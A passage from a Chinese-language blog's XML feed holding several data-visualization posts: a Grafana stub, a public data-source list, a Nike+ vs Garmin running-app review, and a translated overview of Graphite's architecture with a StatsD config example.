<li><a href="https://thenewstack.io/architectural-requirements-customers-require-processing-millions-events-per-second/?utm_content=buffere9607&amp;utm_medium=social&amp;utm_source=twitter.com&amp;utm_campaign=buffer">Mesosphere DC/OS Brings Large-Scale Real-Time Processing to Geospatial Data | 29 Sep 2017 6:00am, by Scott M. Fulton III</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzQwNjcyMQ==&amp;mid=2651005031&amp;idx=1&amp;sn=1a7ae9e90caa6d4b233a7bf748f338ad&amp;scene=1&amp;srcid=0429ezgBTFRCirHNnTSWPWNb#rd">何苞旦:中国古人如何绘制地图</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>数据可视化</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>Grafana</title>
    <url>/2017/11/22/Visualization-Grafana/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>待编辑</strong></p>
<a id="more"></a>
<h2 id="ABC"><a href="#ABC" class="headerlink" title="ABC"></a>ABC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install grafana</span><br><span class="line">brew services start grafana</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src/github.com/appliedgo/diydashboard</span><br></pre></td></tr></table></figure>
<h2 id="扩展阅读：数据可视化"><a href="#扩展阅读：数据可视化" class="headerlink" title="扩展阅读：数据可视化"></a>扩展阅读：数据可视化</h2><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-BestAppMap">数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测</a></li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.com/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.com/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.com/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://opensource.com/article/19/2/infrastructure-monitoring" target="_blank" rel="noopener"></a></li>
<li><a href="http://cizixs.com/2018/01/24/use-prometheus-and-grafana-to-monitor-linux-machine" target="_blank" rel="noopener">使用 promethues 和 grafana 监控自己的 linux 机器</a></li>
<li><a href="https://www.howtoforge.com/tutorial/how-to-install-grafana-on-linux-servers/" target="_blank" rel="noopener">How to Install Grafana on Linux Servers</a></li>
<li><a href="https://appliedgo.net/diydashboard/" target="_blank" rel="noopener">A DIY Dashboard with Grafana</a></li>
<li><a href="http://blog.takipi.com/graphite-vs-grafana-build-the-best-monitoring-architecture-for-your-application/" target="_blank" rel="noopener">Graphite vs. Grafana: Build the Best Monitoring Architecture for Your Application</a></li>
<li><a href="https://ivanursul.com/better-application-deployment-monitoring-your-application-with-graphite-grafana" target="_blank" rel="noopener">Better application deployment. Monitoring your application with Graphite/Grafana</a></li>
<li><a href="https://github.com/ganglia/monitor-core/wiki/Ganglia-Graphite" target="_blank" rel="noopener">Ganglia Graphite | 2015 </a></li>
<li><a href="https://blog.golang.org/8years" target="_blank" rel="noopener">Eight years of Go </a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>数据可视化</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>数据可视化（十）公共数据源列表</title>
    <url>/2018/01/15/Visualization-DataSource/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>优质公开数据源列表</li>
<li>技术支持：爬虫、数据分析与可视化</li>
</ul>
<span id="more"></span>
<h2 id="一、数据源"><a href="#一、数据源" class="headerlink" title="一、数据源"></a>一、数据源</h2><h4 id="教学数据"><a href="#教学数据" class="headerlink" title="教学数据"></a>教学数据</h4><ul>
<li><a href="http://snap.stanford.edu/data/">(教学数据) Stanford Large Network Dataset Collection</a></li>
</ul>
<h4 id="公共数据"><a href="#公共数据" class="headerlink" title="公共数据"></a>公共数据</h4><ul>
<li><a href="www.eiu.com">经济学人·智库EIU</a></li>
<li><a href="http://data.worldbank.org.cn/indicator">世界银行·公开数据</a></li>
<li><a href="https://goldengrape.github.io/posts/python/worldbank-data-cleaner/">世界银行数据清洗器</a></li>
<li><p><a href="http://fsi.stanford.edu/news">FSI（Freeman Spogli Institute for International Studies at Stanford)</a></p>
</li>
<li><p><a href="http://www.stats-sh.gov.cn/html/sjfb/">上海市统计局</a></p>
</li>
<li><a href="http://www.nhfpc.gov.cn/jkj/s3578/new_list.shtml">中国疾病控制中心：每月疫情通报</a></li>
<li><a href="http://www.miit.gov.cn/newweb/n1146312/n1146904/n1648372/c5966257/content.html">中国工业和信息化部：电话用户分省情况</a></li>
<li><a href="http://zhs.mof.gov.cn/zhuantilanmu/caipiaoguanli/">中国财政部：彩票销售</a></li>
<li><a href="http://www.casad.cas.cn/chnl/371/index.html">中国科学院：院士名单</a></li>
<li><a href="#">教育部</a><br>2017年全国入园儿童1922.09万人，比上年减少86.76万人。在园儿童（包括附设班）4413.86万人，比上年增加149.03万人。幼儿园园长和教师共249.88万人，比上年增加19.56万。</li>
<li><a href="http://www.mpcsc.org/">重大工程案例研究和数据中心 | 同济大学</a></li>
</ul>
<h4 id="Nature"><a href="#Nature" class="headerlink" title="Nature"></a>Nature</h4><ul>
<li><a href="http://www.who.int/gho/zh/">WTO:Global Health Observatory (GHO) data</a></li>
<li><a href="https://pubchem.ncbi.nlm.nih.gov/">美国国家生物技术信息中心</a></li>
<li><a href="https://ndb.nal.usda.gov/ndb/search/list?fgcd=&amp;manu=&amp;lfacet=&amp;count=&amp;max=&amp;sort=&amp;qlookup=&amp;offset=&amp;format=Abridged&amp;new=&amp;measureby=&amp;ds=&amp;order=&amp;qt=&amp;qp=&amp;qa=&amp;qn=&amp;q=&amp;ing=">美国农业部·食品成分数据库 | USDA Food Composition Databases</a></li>
<li><a href="https://www.bts.gov/publications/pocket_guide_to_transportation/">美国交通部·公开数据库</a></li>
</ul>
<h2 id="二、技术支持"><a href="#二、技术支持" class="headerlink" title="二、技术支持"></a>二、技术支持</h2><h4 id="数据可视化（五）基于网络爬虫制作可视化图表"><a href="#数据可视化（五）基于网络爬虫制作可视化图表" class="headerlink" title="数据可视化（五）基于网络爬虫制作可视化图表"></a><a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></h4><ul>
<li>图表数据可视化技术方案</li>
<li>基于网络爬虫的可视化图表</li>
</ul>
<h4 id="数据可视化（八）Program-Data-and-Classical-Music"><a href="#数据可视化（八）Program-Data-and-Classical-Music" class="headerlink" title="数据可视化（八）Program,Data and Classical Music"></a><a href="https://riboseyim.github.io/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></h4><ul>
<li>基于 Go + R  可视化古典音乐作曲家社交网络</li>
<li>Coperformance 是一个业余项目，编程分析纽约爱乐乐团演出历史数据库。</li>
</ul>
<h2 id="三、案例"><a href="#三、案例" class="headerlink" title="三、案例"></a>三、案例</h2><ul>
<li>案例：最近十年全国彩票销售变化情况 <a href="https://riboseyim.github.io/charts/caipiao/index.html">在线演示</a></li>
<li>案例：中国科学院院士分布（出生地与籍贯）<a href="https://riboseyim.github.io/charts/casad/index.html">在线演示</a></li>
<li>案例：美国航空入境旅客（出发地）变化情况 <a href="https://riboseyim.github.io/charts/usa-traffic/index.html">在线演示</a></li>
<li>案例：世界主要国家专利申请变化情况（欧洲专利局） <a href="https://riboseyim.github.io/charts/ip/index.html">在线演示</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/usa-traffic-2015.png" alt=""></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Economist</tag>
        <tag>Policy&amp;Law</tag>
        <tag>数据可视化</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>数据可视化（二）跑步应用数据可视化评测</title>
    <url>/2016/04/26/Visualization-RunningApp/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>案例：跑步应用Nike+ Running 和 Garmin Mobile 评测</li>
<li>评估场景：跑步</li>
<li>评估时间：2016.02.22</li>
<li>评估说明：所有评测数据为作者真实体验测量，不针对特定厂家。</li>
<li><a href="http://www.jianshu.com/p/5290fc641230">首发版（简书）：跑步应用Nike+ Running 和 Garmin Mobile 评测 |20160222</a></li>
</ul>
<span id="more"></span>
<h4 id="评估框架"><a href="#评估框架" class="headerlink" title="评估框架"></a>评估框架</h4><p>本次评估将以此为框架，逐一对比，双方都有的特性直接抵消忽略，不再讨论。核心子系统可概括为：硬件平台、跑步系统、数据分析系统、教练系统、荣誉系统、社交系统、其它支持。作为一款个人应用产品，社交系统是各厂追逐的王冠。</p>
<ul>
<li>评估框架</li>
<li>竞争项目明细<br><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E8%AF%84%E4%BC%B0%E6%A1%86%E6%9E%B6.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E8%AF%84%E4%BC%B0%E6%98%8E%E7%BB%86.png" alt=""></li>
</ul>
<h4 id="主页系统"><a href="#主页系统" class="headerlink" title="主页系统"></a>主页系统</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E4%B8%BB%E9%A1%B5.png" alt=""></p>
<h4 id="分析系统"><a href="#分析系统" class="headerlink" title="分析系统"></a>分析系统</h4><ul>
<li>Nike: 数据高度融合，无时无刻不突出变化、突出趋势</li>
<li>Garmin:数据离散、基本无融合，平铺直叙  (更正：20160513 v3.6 已实现心率、高度、步频叠加层)<br><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E5%88%86%E6%9E%90_1.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E5%88%86%E6%9E%90_2.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E5%88%86%E6%9E%90_3.png" alt=""></li>
</ul>
<h4 id="社交应用"><a href="#社交应用" class="headerlink" title="社交应用"></a>社交应用</h4><p>基于庞大的消费群体、软件的低门槛，Nike+ Running的用户基数应该大很多（暂无统计数字支撑）。</p>
<ul>
<li>日历系统：各有千秋<br><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E6%97%A5%E5%8E%86.png" alt=""></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E6%8E%A8%E8%8D%90.png" alt="佳明自动推荐赛段功能，赞"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E7%A4%BE%E4%BA%A4.png" alt=""></p>
<h4 id="荣誉系统"><a href="#荣誉系统" class="headerlink" title="荣誉系统"></a>荣誉系统</h4><p>在这一单项中，Garmin的劣势非常明显，完全暴露的产品设计、运营能力的巨大短板。<br>Nike+ Running则形成了非常完善的勋章系统，有利于提高用户粘性，为很多厂家所借鉴。包括但不限于：</p>
<ul>
<li>里程：段位等级制（个人综合）   奖杯制 （每月，分为金、银、铜等）</li>
<li>积分：5K、10K、50K、100K等</li>
<li>连续性：1周3次、1周5次、连续3个月、连续6个月等</li>
<li><p>纪念性：周年、特殊节日、夜猫子、运动鞋、微博分享纪念等</p>
</li>
<li><p>荣誉系统－Nike+徽章体系<br><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E8%8D%A3%E8%AA%89.png" alt=""></p>
</li>
<li><p>荣誉系统－Garmin徽章体系:能走点心吗？<br><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E8%8D%A3%E8%AA%89_Garmin.png" alt=""></p>
</li>
</ul>
<h4 id="教练系统"><a href="#教练系统" class="headerlink" title="教练系统"></a>教练系统</h4><p>按照不同目标，可以推荐制定个人训练计划，并提供分析数据，不仅提高了趣味性，更体现了对入门级玩家的关怀。<br><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E6%95%99%E7%BB%83.png" alt=""></p>
<h4 id="硬件平台"><a href="#硬件平台" class="headerlink" title="硬件平台"></a>硬件平台</h4><p>Garmin自有硬件平台,已经形成高低搭配的产品线，但是也限制了其APP兼容其他硬件厂家的可能性。<br>Nike前几年尝试过内嵌跑鞋的传感器、TomTom贴牌代工的Sport Watch, 市场反馈看起来不好。几款产品目前都已停产，其战略完全转为纯软件路线：包括第一批支持Apple Watch,成为预置APP，全面支持Apple Health,支持TomTom、Garmin终端采集数据共享。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E7%A1%AC%E4%BB%B6.png" alt=""></p>
<h4 id="改进空间"><a href="#改进空间" class="headerlink" title="改进空间"></a>改进空间</h4><p>数据分析系统中，如果可以选择多次训练数据进行对比，应用的实用性和娱乐性会更强。甚至可以推荐相同“赛段”的历史数据对比。<br>在户外运动场景，温度、湿度、风力、天气、气压的情况对成绩有较大影响。目前这两款应用都只做到记录当天的天气概况（晴、雨等），对于深度、活跃用户来说略显不足。第三点不足，基于众所周知的原因，或者大陆运营力量的不足，数据上传、售后服务皆有不稳定的情况。<br><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E4%B8%8D%E8%B6%B3.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E5%A4%A9%E6%B0%94.png" alt=""></p>
<ul>
<li>结论</li>
<li>Nike+ Running： 系出豪门，设计感强，交互体验完胜；</li>
<li>Garmin Connect Mobile : 自有硬件平台优势突出，设计体验凌乱，运营优待提升。<br><img src="http://riboseyim-qiniu.riboseyim.com/APP_Running_201602_Garmin_Nike_%E5%87%80%E8%AF%84%E4%BC%B0.png" alt=""></li>
</ul>
<h2 id="扩展阅读：数据可视化"><a href="#扩展阅读：数据可视化" class="headerlink" title="扩展阅读：数据可视化"></a>扩展阅读：数据可视化</h2><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-BestAppMap">数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测</a></li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.com/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.com/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.com/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考案例"><a href="#参考案例" class="headerlink" title="参考案例"></a>参考案例</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/VZy7kqUL2P9q6uggqc02Sw">共享单车APP评测 | 优恪</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>数据可视化</tag>
        <tag>运动</tag>
        <tag>体能训练</tag>
        <tag>移动互联网</tag>
      </tags>
  </entry>
  <entry>
    <title>数据可视化（七）Graphite 体系结构详解</title>
    <url>/2017/12/04/Visualization-Graphite/</url>
    <content><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><ul>
<li>1.指标采集器 -  Dropwizard Metrics, StatsD</li>
<li>2.监听器 - Carbon, graphite-ng, Riemann</li>
<li>3.存储数据库 – Whisper, InfluxDB, Cyanite</li>
</ul>
<span id="more"></span>
<ul>
<li><a href="https://blog.takipi.com/graphite-vs-grafana-build-the-best-monitoring-architecture-for-your-application/">Josh Dreyfuss: Graphite vs. Grafana: Build the Best Monitoring Architecture for Your Application</a></li>
</ul>
<p>Graphite 是处理可视化和指标数据的优秀开源工具。它有强大的查询 API 和相当丰富的插件功能设置。事实上，Graphite 指标协议（metrics protocol）是许多指标收集工具的事实标准格式。然而，Graphite 并不总是一个可以简单部署和使用的工具。由于设计方面的原因，加上它使用过程中涉及大量的小 I/O 操作，在规模化应用中会遇到一些问题，而且部署起来可能有点麻烦。</p>
<p>Graphite 部署痛苦的部分原因是，它是由三个不同的元素组成（当然，如果包括指标采集就是四个），这些取决于你的环境，只有其中一个或多个默认元素可能不能满足你的需要。<br>￼<br><img src="http://riboseyim-qiniu.riboseyim.com/Graphite-OverView-2.png" alt="Graphite  Architecture Diagram"></p>
<p>虽然 Graphite 包含三个组件可能会导致一些实施的问题，但也有积极的成果。每一个模块块都是一个独立的单元，这样你就可以按照实际的需要混合和匹配使用三个组件中的哪一个。同时意味着您可以为自己构建一个完全定制化的 Graphite 部署方案。</p>
<p>让我们逐一来看看你需要做些什么，对于 Graphite 的每一个组成部分来说，都可以是一个 Graphite 的方案或者是非 Graphite 的替代品。</p>
<h4 id="1-指标采集器-Dropwizard-Metrics-StatsD"><a href="#1-指标采集器-Dropwizard-Metrics-StatsD" class="headerlink" title="1. 指标采集器 - Dropwizard Metrics, StatsD"></a>1. 指标采集器 - Dropwizard Metrics, StatsD</h4><p>Graphite 部署方案中的的第一个步骤根本不是 Graphite 的组成部分。这是因为 Graphite 自身并不支持采集任何指标；Graphite 需要有人将指标数据发送给它。这通常不是一个特别大的限制，因为大多数指标采集器都支持以 Graphite 格式提供指标数据，但仍然有一些东西需要注意。我们可选的不同指标采集器可以列一个庞大的列表，但是没有一个工具是包含在基础 Graphite 中的。</p>
<p>选择你的指标采集器 – Graphite 文档中提供了一个<a href="http://graphite.readthedocs.io/en/latest/tools.html">工具列表</a>，包括流行的选择像 CollectD 和 Diamond ，但它很少更新，所以你还可以考虑以下两个方案：</p>
<p>Dropwizard Metrics – <a href="Metrics is a Java library which gives you unparalleled insight into what your code does in production.">Metrics</a> 是一个 Java 库，通过一系列指标为你提供生产环境的可视化。它有一个 Graphite Reporter，可以将所有的指标数据发送到 Graphite 实例。对于需要在 Java 生态中使用 Graphite 的场景来说，它是一个不错的选择。</p>
<p>StatsD – <a href="https://github.com/etsy/statsd">StatsD</a> 是一个基于 Node.js 运行的网络守护进程，来自 Etsy (网络电商平台)。它可以监听一系列统计、指标数据，并将它们聚集到像 Graphite 这样的工具中。StatsD 也可以和很多其他的可视化、指标采集工具一起工作。</p>
<p><strong>小结</strong>： Graphite 不和特定的指标采集器捆绑。然而， Graphite 指标协议是非常常见的，因此不难找到一个或多个与您的应用程序一起工作的协议。既然有这么多的指标采集器和 Graphite 配合良好，你不需要只选择一个，你可以选择从多个数据源发送指标。</p>
<h4 id="2-监听器-Carbon-graphite-ng-and-Riemann"><a href="#2-监听器-Carbon-graphite-ng-and-Riemann" class="headerlink" title="2. 监听器 - Carbon, graphite-ng, and Riemann"></a>2. 监听器 - Carbon, graphite-ng, and Riemann</h4><p>Graphite 的另一部分是用于监听发送的指标数据并将其写入磁盘的组件 —— Carbon （原意：碳）。Carbon 是由守护进程组成的，在工作方式方面有一些内置的灵活性。</p>
<p>在基本的小规模部署中， Carbon 守护程序会监听指标数据并将它们报告给 Whisper 存储数据库。然而，随着规模的增长可以添加一个聚合元素（A ggregation），它在一段时间内缓冲指标数据，然后将它们发送给一个大块中的 Whisper 。你也可以使用 Carbon 传递指标副本到多个 Carbon 后台。当你达到更高的规模、需要多个 Carbon 后台程序来处理传入的指标数据时，这一点特别有用。</p>
<p>缺点和潜在的问题 —— 人们通常遇到的问题通常跟规模相关。就规模应用而言，Carbon 有以下几个缺点 ：</p>
<ul>
<li>一个单独的 Carbon 守护程序处理能力有限，因为它是用 Python 语言设计的。本机代码不支持一次多个线程同时运行（ Multiple  threads），所以可能出现 Carbon 守护程序刚刚启动时丢弃指标数据的情况。</li>
<li>Carbon 有一个它一次能处理负载数量的阈值，但这个阈值并没有传达给你。</li>
<li>Carbon 并没有持续打开 Whisper 的文件句柄，所以存储每个指标都需要多步的完整读/写序列。</li>
</ul>
<p>基于标准的 Graphite 部署实例中，这些情况的解决方法是将工作划分为中继器（ Carbon relays） 和 缓存（Carbon caches ）。尽管如此，您仍然需要注意负载，因为超过了 Carbon 的负荷会导致数据丢失。如果这个后果对你来说无法接受，可以看看 Carbon 的替代解决方案。</p>
<p><strong>Carbon 替代方案</strong><br>Carbon 的另一种替代方法是 <a href="https://github.com/graphite-ng">graphite-ng</a>，本质上是基于 Go 语言重写了一遍 Carbon ，以解决上面提到的几个问题。迄今为止，该项目的重点是改进 Carbon 的中继和聚合功能。如果你喜欢 Carbon 的功能，但是又想要绕过一些性能方面的限制，这是一个不错的选择。</p>
<p>另一个替代方案是 <a href="http://riemann.io/">Reimann</a>。基于 Clojure 语言实现（属于 LISP 编程语言家族），Reimann 是用来聚集和处理“事件流（event streams）”。事件和流都是相当简单的概念，Riemann 能代替 Carbon 把它们发送到 Graphite 实例。它在这个过程增加了一些提供了额外的好处，例如告警功能。如果你想设计一个远离 Carbon 的架构，这是一个很好的选择，还能加入一些涉及告警方面的能力。</p>
<p><strong>争议观点</strong></p>
<blockquote>
<p>Cyanite does not only “work with carbon”. Just like influxdb, it implements the graphite line receiver protocol and thus replaces carbon-cache.</p>
<p>Riemann can’t send data to your graphite deployment “in place of carbon”. It can act as a much more powerful carbon-aggregator, but it doesn’t replace carbon-cache.</p>
</blockquote>
<p>小结： Carbon 负责监听指标数据并将它们写入到您的存储数据库，但经常在规模化应用上遇到性能问题。有一些现成的替代方案可以解决这个问题。</p>
<h4 id="3-存储数据库-–-Whisper-InfluxDB-Cyanite"><a href="#3-存储数据库-–-Whisper-InfluxDB-Cyanite" class="headerlink" title="3. 存储数据库 – Whisper, InfluxDB, Cyanite"></a>3. 存储数据库 – Whisper, InfluxDB, Cyanite</h4><p>您需要选择的下一个组件是存储数据库。在 Graphite 体系结构中称之为 Whisper。Whisper 是一种固定大小的数据库，用于存储时间序列数据，在保存和取样方面提供了相当的精确度。在标准的 Graphite 部署中，Carbon 将指标值写入 Whisper 存储，用于在 Graphite-web 组件中实现可视化。</p>
<p>缺点和潜在问题：Whisper  基于 RRD（Round- Robin Database），但写入操作的时候有一些关键性的差异，例如回填项目历史数据和处理不规则数据的能力。这里有一些指标和可视化工具的有用特性，但它们的实现都是基于某种折衷。</p>
<ul>
<li>因为 Whisper 是用Python编写的，所以相对来说性能较慢；</li>
<li>按照 Whisper 的设计，它会遇到一些存储空间的问题，因为每个指标都需要一个文件，并且都是单个实例。这是一种有意的权衡，以实现前面提到的一些好处，但不可否认，Whisper 对磁盘空间的利用效率较低。</li>
<li>由于 Carbon 和 Whisper 在设计方面的原因，它们最终都涉及到大量的 IO 请求。当你超越小型部署时，磁盘 IO 的伸缩能力会成为摆在面前的一个问题。</li>
</ul>
<p><strong>Whisper 替代方案</strong><br>你可以通过部署固态硬盘（SSD）或者其它一些设计解决 Whisper 的性能问题，但也只是点到为止。如果数据库部分正是你所需要的，那么有几个选择可以考虑。</p>
<p>目前主要的一个选择是 influxdata（InfluxDB）。influxdata 是一个基于 LevelDB、用 Go 语言编写的时间序列数据库。influxdata 能够解决一些磁盘 IO 写优化问题，同时不要求 one metric = one file  。</p>
<p>influxdata 支持 Carbon 使用的协议，使它能够悄悄置换 Whisper，实现类似 SQL的查询语言。甚至已经有一些项目设计用来使 influxdata 的置换更简便易行，例如 graphite-influxdb 项目 ，使得可以和 Graphite 的 API 无缝衔接。influxdata 属于非常有前途的新兴项目，可以在广泛的范围内与其他工具一起工作。</p>
<p>另一个选择是使用基于 Cassandra 的存储数据库。得益于 <a href="https://github.com/brutasse/graphite-cyanite">graphite-cyanite</a> 项目的工作，基于 Cyanite 数据库可以很容易实现这一目的。 <a href="https://github.com/pyr/cyanite">Cyanite</a> 的开发规划目标就是在 Graphite 体系结构中替换 Whisper ，这意味着它可以和 Carbon 、 Graphite-web 一起工作（需要少量的一些依赖）。使用 Cyanite 有助于解决 Whisper 在大规模部署场景中存在的性能和高可用问题。</p>
<p>小结 ： Graphite 体系结构中，数据存储组件是 Whisper 。在大规模应用中，除非你在硬件方面大量投入、把它分解成复杂的手动集群模式，否则将悄悄地会遇到一些性能和可用性问题。如果你需要关注这些问题，可以使用数据库的替代选项来提高性能和可用性。</p>
<h4 id="4-可视化组件-–-Graphite-Web-和-Grafana"><a href="#4-可视化组件-–-Graphite-Web-和-Grafana" class="headerlink" title="4. 可视化组件  – Graphite-Web 和 Grafana"></a>4. 可视化组件  – Graphite-Web 和 Grafana</h4><p>一旦你收集并存储了指标数据，就下来的步骤就是可视化它们。Graphite-web 的角色就是提供可视化。 Graphite-web 是一种基于 Django 的 Web 应用程序，提供指标数据可视化和交互能力。它在数据的处理方面提供了相当多的能力，但可视化组件并不十分美观（也就是说 “土”、“丑”）。Graphite-web 作为前端组件，我们将着重讨论用户体验的相关内容。<br>￼<br><img src="http://riboseyim-qiniu.riboseyim.com/Graphite-OverView-3.png" alt="A standard Graphite Dashboard"></p>
<p><strong>Graphite-web  替代方案</strong><br>归功于卓越的  Graphite API ，目前有一系列第三方仪表盘工具可以支持 Graphite 。因为有如此众多的可视化选项，它们的优劣其实主要取决于个人品味，再次不作过多扩展，但我确实想特别指出其中的一个。也许最具潜力的  Graphite 可视化替代方案， 或至少是人们谈论最多的是 Grafana 。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Graphite-OverView-1.png" alt="Dashboards in Grafana"></p>
<p>Grafana 是一个开源的仪表盘工具，可以兼容 Graphite 和 InfluxDB 。Grafana 曾经只是一个基于 Elasticsearch 存储的前端仪表盘工具，从 V2.0 版本开始，它拥有了一个支持用户自定义的后端存储组件。Grafana 在设计之初即考虑到支持 Graphite 创建更加优美的可视化组件，因此它非常适合替换默认的 Graphite-web 。Grafana 功能相当丰富，性能稳定。Grafana 拥有一个后端组件，如果你也可以找到纯粹的前端工具，Graphite 文档中提供了工具列表。</p>
<p>小结： 如果你觉得 Graphite 提供的默认可视化效果过于基础和乏味，有大量的可视化替代方案可以选择。其中一些是纯粹客户端，有的包含一个存储你建立的仪表盘后端组件。不管你要什么，你都能在这里找到东西。</p>
<h4 id="5-代码级指标-–-Trends"><a href="#5-代码级指标-–-Trends" class="headerlink" title="5. 代码级指标 – Trends"></a>5. 代码级指标 – Trends</h4><p>OverOps 发布了一个新的功能，可以让你把代码级指标从 JVM 应用程序中的错误、与变量状态在一起发送到 Graphite 。详细：<a href="https://www.overops.com">https://www.overops.com</a></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> backends: [ <span class="string">&quot;./backends/graphite&quot;</span> ]   <span class="comment">// identify this backend as Graphite</span></span><br><span class="line"> graphitePort: <span class="number">2003</span>,                   <span class="comment">// port of Graphite server </span></span><br><span class="line"> graphiteHost: <span class="string">&quot;graphite.example.com&quot;</span>, <span class="comment">// hostname or IP of Graphite server</span></span><br><span class="line"> deleteCounters: <span class="literal">true</span>,</span><br><span class="line"> graphite: &#123;  <span class="comment">// Graphite tweaks for Takipi</span></span><br><span class="line">   prefixCounter: <span class="string">&quot;&quot;</span>,</span><br><span class="line">   prefixGauge: <span class="string">&quot;&quot;</span>,</span><br><span class="line">   globalPrefix: <span class="string">&quot;&quot;</span>,</span><br><span class="line">   legacyNamespace: <span class="literal">false</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>所有针对 Graphite 的投诉都集中于（它的工作性能不够稳定，仪表盘丑陋！规模化部署是硬伤！），但不妨碍它成为一个很流行的工具。如果你想要一个开源的指标和可视化工具，为许多企业级工具提供支持，那么 Graphite 值得一试。其中最重要的一点是，你可以自定义数据内容。Graphite 并不是由完全特定的组件一起工作，其中的乐趣何在 ？经过一些尝试和错误，您可以在您自己的环境中构建一个完全定制化的、非常有用 Graphite （或类似 Graphite 的）部署方案。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/opensource-graphite.png" alt="Graphite"></p>
